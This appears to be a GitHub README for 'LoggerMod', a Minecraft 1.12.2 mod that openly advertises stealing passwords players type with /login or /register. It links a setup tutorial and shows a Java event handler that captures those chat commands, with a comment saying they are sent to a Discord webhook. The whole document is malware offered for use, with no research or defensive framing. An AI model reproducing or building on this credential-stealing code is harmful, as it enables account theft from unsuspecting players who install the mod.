# 🔌 LoggerMod
This mod on 1.12.2 steals the entered passwords (Entered via /login)


# ⚡ How to configure?
You can easily change the config for yourself  
Tutorial: [Click](https://www.youtube.com/watch?v=RxuuHBnjgj0) (in Russian)

# ❓ How it Works?
```java
    @SubscribeEvent
    public void ChatEvent(ClientChatEvent e) {
        String msg = e.getMessage();
        String[] sentences = e.getMessage().split(" ");
        if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
            // Sending to your discord server use Webhook
        }
    }

``` 

# 📱 Screenshots
![Screenshot_20220524_201426](https://user-images.githubusercontent.com/100863585/170095387-ad0eaa4b-b844-4b3b-8d5e-70b9012abe43.png)
